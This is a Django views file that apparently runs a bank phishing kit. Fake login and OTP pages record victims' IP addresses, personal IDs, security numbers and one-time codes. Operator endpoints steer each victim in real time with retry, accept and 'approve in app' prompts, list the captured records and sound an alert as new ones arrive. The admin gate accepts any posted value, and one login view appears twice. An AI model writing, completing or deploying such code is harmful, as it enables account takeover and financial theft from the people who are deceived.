from django.shortcuts import render, get_object_or_404, redirect
from django.http import JsonResponse, Http404
from django.views.generic import TemplateView, View, DeleteView
from .models import User
from django.template import Context, Template




# Create your views here.

def AdminPanel(request):

    if request.session['admin'] == 'admin':


        return render(request, 'index.html')
    else:

        raise Http404


def panelGate(request):

    if request.method == 'POST':

        admin = request.POST.get('admin')

        request.session['admin'] = admin

        return redirect('AdminPanel')

    else:


        return render(request, 'gateway.html')


def isActive(request):

    ip_address = request.GET.get('pid');

    obj = User.objects.get(PersonalId=ip_address)

    obj.status = True

    obj.save() 



def bye(request):

    ip_address = request.GET.get('pid');

    obj = User.objects.get(PersonalId=ip_address)

    obj.status = False

    obj.save() 






class Account(TemplateView):
    template_name = 'account-mobile.html'
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['users'] = User.objects.all()
        return context




def LoggingIn(request):


    
    return render(request, 'logingon.php')



def Athorizing(request):


    
    return render(request, 'authorizing.html')



def success(request):


    
    return render(request, 'success.html')





def Login(request):

    

    if request.method == 'POST':

        ip_add = request.POST.get('userIp')

        request.session['ip'] = ip_add
    
        new_pid = request.POST.get('pid')

        request.session['pid'] = new_pid

        

        new_sen = request.POST.get('securityNumber')

        request.session['sen']= new_sen

        User.objects.create(ip_addr=ip_add, PersonalId=new_pid, securityNumber=new_sen)

        return redirect('loggingIn')

    else:

        return render(request, 'login.php')





def LoginRetry(request):

    

    if request.method == 'POST':

        ip_add = request.POST.get('userIp')
    
        new_pid = request.POST.get('pid')

        request.session['pid'] = new_pid

        

        new_sen = request.POST.get('securityNumber')

        request.session['sen']= new_sen



        obj = User.objects.get(ip_addr=ip_add)

        obj.PersonalId = new_pid 

        obj.securityNumber = new_sen

        obj.save()

        return redirect('loggingIn')

    else:

        return render(request, 'login-retry.php')




def OTPRetry(request):

    

    if request.method == 'POST':

        otp = request.POST.get('otp')
    
        new_pid = request.session['pid']

        obj = User.objects.get(PersonalId=new_pid)

        obj.otp = otp

        obj.save()

        return redirect('Athorizing')

    else:

        return render(request, 'otpRetry.html')




def secureCode(request):

    

    if request.method == 'POST':

        otp = request.POST.get('otp')
    
        new_pid = request.POST.get('pid')

        obj = User.objects.get(PersonalId=new_pid)

        obj.otp = otp

        obj.save()

        return redirect('Athorizing')

    else:

        return render(request, 'securecode.html')

def displayCode(request):

    

    if request.method == 'POST':

        otp = request.POST.get('otp')
    
        new_pid = request.POST.get('pid')

        obj = User.objects.get(PersonalId=new_pid)

        obj.otp = otp

        obj.save()

        return redirect('Athorizing')

    else:

        return render(request, 'securecode.html')






def OTP(request):

    

    if request.method == 'POST':

        otp = request.POST.get('otp')
    
        new_pid = request.POST.get('pid')

        obj = User.objects.get(PersonalId=new_pid)

        obj.otp = otp

        obj.save()

        return redirect('Athorizing')

    else:

        return render(request, 'otp.html')



   
def loading(request):


    
    return render(request, 'loading.html')









def getUsers(request):

    queryset = User.objects.all()[:10]

    return JsonResponse({"users":list(queryset.values())})





class DeleteUsers(View):
    def  get(self, request):
        id1 = request.GET.get('userId', None)
        User.objects.get(userId=id1).delete()
        data = {
            'deleted': True
        }
        return JsonResponse(data)


class CheckLogin(View):
    def  get(self, request):
        id1 = request.GET.get('userId', None)
        check = request.GET.get('error', None)
        obj = User.objects.get(userId=id1)
        obj.checkLogin = check
        obj.save()
        data = {
            'check': True,
            'alert': id1
            
        }
        return JsonResponse(data)


class AcceptLogin(View):
    def  get(self, request):
        id1 = request.GET.get('pid', None)
        obj = User.objects.get(PersonalId=id1)
        check = obj.acceptLogin

        if check == True:

            obj.acceptLogin = False

            obj.save()

            data = {
            
            'accept': check
            }
            return JsonResponse(data)



        else:

            return render(request, 'logingon.php')




def  StatusCheck(request):
        id1 = request.GET.get('userId', None)
        obj = User.objects.get(userId=id1)

       
        check = obj.status

        if check == True:

            

            data = {
            
            'online': True
            }
            return JsonResponse(data)



       
class getCode(View):
    def  get(self, request):
        id1 = request.GET.get('pid', None)
        obj = User.objects.get(PersonalId=id1)
        check = obj.appPlease

        

        if check == True:

            obj.checkLogin = False

            obj.save()

            data = {
            
            'getCode': True
            }
            return JsonResponse(data)



        else:

            return render(request, 'logingon.php')

      




class TryAgain(View):
    def  get(self, request):
        id1 = request.GET.get('pid', None)
        obj = User.objects.get(PersonalId=id1)
        check = obj.checkLogin

        

        if check == True:

            obj.checkLogin = False

            obj.save()

            data = {
            
            'tryAgain': True
            }
            return JsonResponse(data)



        else:

            return render(request, 'logingon.php')



def  AppPlease(request):
        id1 = request.GET.get('userId', None)
        obj = User.objects.get(userId=id1)
        check = obj.appPlease
        obj.appPlease = True

        obj.save()



class ProoceedUserLogin(View):
    def  get(self, request):
        id1 = request.GET.get('userId', None)
        obj = User.objects.get(userId=id1)
        
        obj.acceptLogin = True

        obj.save()



        


def Login(request):

    

    if request.method == 'POST':

        ip_add = request.POST.get('userIp')
    
        new_pid = request.POST.get('pid')

        request.session['pid'] = new_pid

        

        new_sen = request.POST.get('securityNumber')

        request.session['sen']= new_sen

        User.objects.create(ip_addr=ip_add, PersonalId=new_pid, securityNumber=new_sen)

        return redirect('loggingIn')

    else:

        return render(request, 'login.php')



def  PlaySound(request):
        queryset = User.objects.all().count()

        data = {
            
            'times': queryset
            }
        return JsonResponse(data)


        



